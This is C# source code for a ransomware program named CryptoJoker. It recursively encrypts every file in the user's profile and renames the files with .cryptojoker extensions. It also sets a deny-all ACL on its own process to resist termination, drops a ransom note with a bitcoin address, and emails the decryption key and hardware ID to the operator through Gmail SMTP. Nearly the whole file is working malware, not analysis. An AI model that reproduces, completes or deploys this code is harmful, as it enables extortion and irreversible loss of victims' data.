using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.ComponentModel;
using System.Net;
using System.Net.Mail;

namespace CryptoJoker
{
    class Program
    {
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, [Out] byte[] pSecurityDescriptor,
            uint nLength, out uint lpnLengthNeeded);
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In] byte[] pSecurityDescriptor);
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentProcess();

        static void Main(string[] args)
        {
            bool mutexResult = JokerIsNotRunning();

            if (!mutexResult)
                return;

            SetAclDenyAll();

            string signalFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "jokingwithyou.cryptojoker");

            if (File.Exists(signalFilePath) == false)
            {
                RunInfector();
            }
        }

        private static void RunInfector()
        {
            try
            {
                //declare important variables for later use
                string signalFilePath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "jokingwithyou.cryptojoker");
                string currentUserPath = Environment.GetEnvironmentVariable("USERPROFILE");
                string encryptionKeyFilePath =
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                        "encKey.cryptojoker");
                string cryptoJokerDecryptor = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                    "CryptoJokerDecryptor.exe");

                string publicKey = string.Empty;
                string publicAndPrivateKey = string.Empty;

                //start encryption process
                List<string> currentUserFiles = GetFiles(currentUserPath, "*.*");
                CryptoClass cryptoClass = new CryptoClass();

                foreach (var file in currentUserFiles)
                {
                    FileInfo fileInfo = new FileInfo(file);

                    if (fileInfo.Extension == ".txt" || fileInfo.Extension == ".md")
                    {
                        //then encrypt it fully
                        try
                        {
                            cryptoClass.EncryptFileFully(fileInfo.FullName);
                            File.Move(fileInfo.FullName,
                                Path.Combine(fileInfo.DirectoryName, fileInfo.Name + ".fully.cryptojoker"));
                        }
                        catch (Exception)
                        {
                        }
                    }
                    else
                    {
                        //then it's an executable or whatever
                        try
                        {
                            cryptoClass.EncryptFilePartially(fileInfo.FullName);
                            File.Move(fileInfo.FullName,
                                Path.Combine(fileInfo.DirectoryName, fileInfo.Name + ".partially.cryptojoker"));
                        }
                        catch (Exception)
                        {
                        }
                    }
                }
                //Generate unique RSA pair keys
                cryptoClass.GenerateKeys(1024, out publicKey, out publicAndPrivateKey);
                //save the encryption key after encryption is done
                byte[] encryptionKeyFileBytes = GetBytes(cryptoClass.EncryptionKey);

                encryptionKeyFileBytes =
                    cryptoClass.RsaEncryption(encryptionKeyFileBytes, 1024, publicKey);

                File.WriteAllText(encryptionKeyFilePath, Convert.ToBase64String(encryptionKeyFileBytes));
                //Create the signal file
                using (StreamWriter streamWriter = new StreamWriter(signalFilePath, true))
                    streamWriter.WriteLine("Do not delete this file, else the decryption process will be broken");
                //Create the text file in desktop
                string cryptoJokerMessage = Properties.Resources.CryptoJokerMessage;

                cryptoJokerMessage = cryptoJokerMessage.Replace("[HWID goes here]", GetHwid());
                cryptoJokerMessage =
                    cryptoJokerMessage.Replace("[bitcoin address]", "1yh3eJjuXwqqXgpu8stnojm148b8d6NFQ");
                File.WriteAllText(
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                        "CryptoJoker Recovery Information.txt"), cryptoJokerMessage, Encoding.Unicode);
                //Send email to ransomware owner
                SendEmail(publicAndPrivateKey);
                //Create the CryptoJoker Decryptor in desktop
                if (!File.Exists(cryptoJokerDecryptor))
                    File.WriteAllBytes(cryptoJokerDecryptor, Properties.Resources.CryptoJoker);
                //Run the CryptoJoker Decryptor in desktop
                Process.Start(cryptoJokerDecryptor);
            }
            catch (Exception)
            {
            }
        }

        private static void SendEmail(string publicPrivateKey)
        {
            string subject = "The HWID is: " + GetHwid() + " And the decryption key is: " + Convert.ToBase64String(GetBytes(publicPrivateKey));

            MailMessage message = new MailMessage(); //new message

            message.From = new MailAddress("theemailtologin@gmail.com"); //your email
            message.To.Add(new MailAddress("theemailtosendthekey@gmail.com")); //destination email

            message.Subject = "New Ransomware Victim!"; // subject
            message.Body = subject; // content
            SmtpClient client = new SmtpClient(); // create a new smtp client
            client.Host = "smtp.gmail.com"; // gmail smtp server. Change accordingly.
            client.Port = 587; //gmail smtp port
            client.EnableSsl = true; //gmail smtp requires Ssl to be enabled
            client.UseDefaultCredentials = false; // do not use the default credentials
            client.Credentials = new NetworkCredential("theemailtologin@gmail.com", "thepasswordoftheaccount"); //In gmail to login to the account you must enable the "login from untrast location" setting
            client.Send(message);
        }

        private static List<string> GetFiles(string path, string pattern)
        {
            var files = new List<string>();

            try
            {
                files.AddRange(Directory.GetFiles(path, pattern, SearchOption.TopDirectoryOnly));
                foreach (var directory in Directory.GetDirectories(path))
                    files.AddRange(GetFiles(directory, pattern));
            }
            catch (Exception) { }

            return files;
        }

        private static void SetAclDenyAll()
        {
            // Get the current process handle
            IntPtr hProcess = GetCurrentProcess();
            // Read the DACL
            var dacl = GetProcessSecurityDescriptor(hProcess);
            // Insert the new ACE
            dacl.DiscretionaryAcl.InsertAce(
                0,
                new CommonAce(
                    AceFlags.None,
                    AceQualifier.AccessDenied,
                    (int)ProcessAccessRights.PROCESS_ALL_ACCESS,
                    new SecurityIdentifier(WellKnownSidType.WorldSid, null),
                    false,
                    null)
            );
            // Save the DACL
            SetProcessSecurityDescriptor(hProcess, dacl);
        }

        private static RawSecurityDescriptor GetProcessSecurityDescriptor(IntPtr processHandle)
        {
            const int DACL_SECURITY_INFORMATION = 0x00000004;
            byte[] psd = new byte[0];
            uint bufSizeNeeded;
            // Call with 0 size to obtain the actual size needed in bufSizeNeeded
            GetKernelObjectSecurity(processHandle, DACL_SECURITY_INFORMATION, psd, 0, out bufSizeNeeded);
            if (bufSizeNeeded < 0 || bufSizeNeeded > short.MaxValue)
                throw new Win32Exception();
            // Allocate the required bytes and obtain the DACL
            if (!GetKernelObjectSecurity(processHandle, DACL_SECURITY_INFORMATION,
                psd = new byte[bufSizeNeeded], bufSizeNeeded, out bufSizeNeeded))
                throw new Win32Exception();
            // Use the RawSecurityDescriptor class from System.Security.AccessControl to parse the bytes:
            return new RawSecurityDescriptor(psd, 0);
        }

        private static void SetProcessSecurityDescriptor(IntPtr processHandle, RawSecurityDescriptor dacl)
        {
            const int DACL_SECURITY_INFORMATION = 0x00000004;
            byte[] rawsd = new byte[dacl.BinaryLength];
            dacl.GetBinaryForm(rawsd, 0);
            if (!SetKernelObjectSecurity(processHandle, DACL_SECURITY_INFORMATION, rawsd))
                throw new Win32Exception();
        }

        private static string GetHwid()
        { 
            UHWIDEngine engine = new UHWIDEngine();
            return engine.SimpleUID;
        }

        private static bool JokerIsNotRunning()
        {
            bool result;
            var mutex = new System.Threading.Mutex(true, "CryptJokerWalker90912", out result);

            if (!result)
            {
                //another instance is already running
                return false;
            }

            GC.KeepAlive(mutex);
            return true;
        }

        private static byte[] GetBytes(string str)
        {
            byte[] bytes = new byte[str.Length * sizeof(char)];
            System.Buffer.BlockCopy(str.ToCharArray(), 0, bytes, 0, bytes.Length);
            return bytes;
        }

        [Flags]
        private enum ProcessAccessRights
        {
            PROCESS_CREATE_PROCESS = 0x0080, //  Required to create a process.
            PROCESS_CREATE_THREAD = 0x0002, //  Required to create a thread.
            PROCESS_DUP_HANDLE = 0x0040, // Required to duplicate a handle using DuplicateHandle.
            PROCESS_QUERY_INFORMATION = 0x0400, //  Required to retrieve certain information about a process, such as its token, exit code, and priority class (see OpenProcessToken, GetExitCodeProcess, GetPriorityClass, and IsProcessInJob).
            PROCESS_QUERY_LIMITED_INFORMATION = 0x1000, //  Required to retrieve certain information about a process (see QueryFullProcessImageName). A handle that has the PROCESS_QUERY_INFORMATION access right is automatically granted PROCESS_QUERY_LIMITED_INFORMATION. Windows Server 2003 and Windows XP/2000:  This access right is not supported.
            PROCESS_SET_INFORMATION = 0x0200, //    Required to set certain information about a process, such as its priority class (see SetPriorityClass).
            PROCESS_SET_QUOTA = 0x0100, //  Required to set memory limits using SetProcessWorkingSetSize.
            PROCESS_SUSPEND_RESUME = 0x0800, // Required to suspend or resume a process.
            PROCESS_TERMINATE = 0x0001, //  Required to terminate a process using TerminateProcess.
            PROCESS_VM_OPERATION = 0x0008, //   Required to perform an operation on the address space of a process (see VirtualProtectEx and WriteProcessMemory).
            PROCESS_VM_READ = 0x0010, //    Required to read memory in a process using ReadProcessMemory.
            PROCESS_VM_WRITE = 0x0020, //   Required to write to memory in a process using WriteProcessMemory.
            DELETE = 0x00010000, // Required to delete the object.
            READ_CONTROL = 0x00020000, //   Required to read information in the security descriptor for the object, not including the information in the SACL. To read or write the SACL, you must request the ACCESS_SYSTEM_SECURITY access right. For more information, see SACL Access Right.
            SYNCHRONIZE = 0x00100000, //    The right to use the object for synchronization. This enables a thread to wait until the object is in the signaled state.
            WRITE_DAC = 0x00040000, //  Required to modify the DACL in the security descriptor for the object.
            WRITE_OWNER = 0x00080000, //    Required to change the owner in the security descriptor for the object.
            STANDARD_RIGHTS_REQUIRED = 0x000f0000,
            PROCESS_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xFFF),//    All possible access rights for a process object.
        }
    }
}
